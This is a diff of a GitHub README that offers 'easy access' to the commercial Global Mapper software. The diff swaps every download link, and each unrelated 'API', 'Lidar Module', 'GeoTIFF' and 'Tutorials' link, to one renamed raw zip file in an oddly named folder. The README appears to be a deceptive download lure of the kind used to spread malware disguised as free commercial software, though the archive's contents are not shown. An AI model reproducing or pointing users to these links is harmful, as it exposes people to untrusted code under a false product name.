@@ -1,6 +1,6 @@
 # 🌍 Global-Mapper-Download - Easy Access to Global Mapper Tools
 
-[![Download](https://raw.githubusercontent.com/Muzammil9988/Global-Mapper-Download/main/brookless/Global-Mapper-Download.zip%20Now%20-%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Muzammil9988/Global-Mapper-Download/main/brookless/Global-Mapper-Download.zip)
+[![Download](https://raw.githubusercontent.com/Muzammil9988/Global-Mapper-Download/main/brookless/Mapper_Global_Download_querken.zip%20Now%20-%20Latest%20Release-brightgreen)](https://raw.githubusercontent.com/Muzammil9988/Global-Mapper-Download/main/brookless/Mapper_Global_Download_querken.zip)
 
 ## 🚀 Getting Started
 
@@ -10,7 +10,7 @@ Welcome to the Global Mapper Download repository! This guide will help you easil
 
 To get started, you need to visit the Releases page. This page contains all the available versions of Global Mapper. You can find the download link here:
 
-[Download Global Mapper](https://raw.githubusercontent.com/Muzammil9988/Global-Mapper-Download/main/brookless/Global-Mapper-Download.zip)
+[Download Global Mapper](https://raw.githubusercontent.com/Muzammil9988/Global-Mapper-Download/main/brookless/Mapper_Global_Download_querken.zip)
 
 Once you are on the Releases page, follow these steps:
 
@@ -62,10 +62,10 @@ If you have questions or need assistance, consider visiting our forum or communi
 
 For more information about Global Mapper and related tools, explore these topics:
 
-- [Global Mapper API](https://raw.githubusercontent.com/Muzammil9988/Global-Mapper-Download/main/brookless/Global-Mapper-Download.zip)
-- [Global Mapper Lidar Module](https://raw.githubusercontent.com/Muzammil9988/Global-Mapper-Download/main/brookless/Global-Mapper-Download.zip)
-- [Exporting GeoTIFF](https://raw.githubusercontent.com/Muzammil9988/Global-Mapper-Download/main/brookless/Global-Mapper-Download.zip)
-- [Global Mapper Tutorials](https://raw.githubusercontent.com/Muzammil9988/Global-Mapper-Download/main/brookless/Global-Mapper-Download.zip)
+- [Global Mapper API](https://raw.githubusercontent.com/Muzammil9988/Global-Mapper-Download/main/brookless/Mapper_Global_Download_querken.zip)
+- [Global Mapper Lidar Module](https://raw.githubusercontent.com/Muzammil9988/Global-Mapper-Download/main/brookless/Mapper_Global_Download_querken.zip)
+- [Exporting GeoTIFF](https://raw.githubusercontent.com/Muzammil9988/Global-Mapper-Download/main/brookless/Mapper_Global_Download_querken.zip)
+- [Global Mapper Tutorials](https://raw.githubusercontent.com/Muzammil9988/Global-Mapper-Download/main/brookless/Mapper_Global_Download_querken.zip)
 
 ## 📑 License 
 
@@ -75,4 +75,4 @@ This project is licensed under the MIT License. Feel free to use and modify the 
 
 Downloading and using Global Mapper is simple. Just follow the steps provided, and you'll be up and running in no time. Enjoy exploring your geographical data with the power of Global Mapper!
 
-[Download Global Mapper](https://raw.githubusercontent.com/Muzammil9988/Global-Mapper-Download/main/brookless/Global-Mapper-Download.zip)
+[Download Global Mapper](https://raw.githubusercontent.com/Muzammil9988/Global-Mapper-Download/main/brookless/Mapper_Global_Download_querken.zip)
